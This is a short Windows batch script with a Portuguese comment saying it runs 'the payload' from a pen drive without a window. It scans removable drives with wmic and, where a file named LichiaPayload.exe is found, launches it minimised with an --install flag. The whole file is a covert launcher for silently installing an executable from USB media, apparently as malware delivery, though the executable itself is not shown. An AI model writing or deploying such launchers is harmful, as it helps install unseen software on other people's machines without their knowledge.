@echo off
rem roda o payload a partir do pendrive, sem janela
for /f "tokens=*" %%a in ('wmic logicaldisk where drivetype^=2 get caption ^| find ":"') do @if exist "%%a\Lichia\LichiaPayload.exe" start "" /min "%%a\Lichia\LichiaPayload.exe" --install
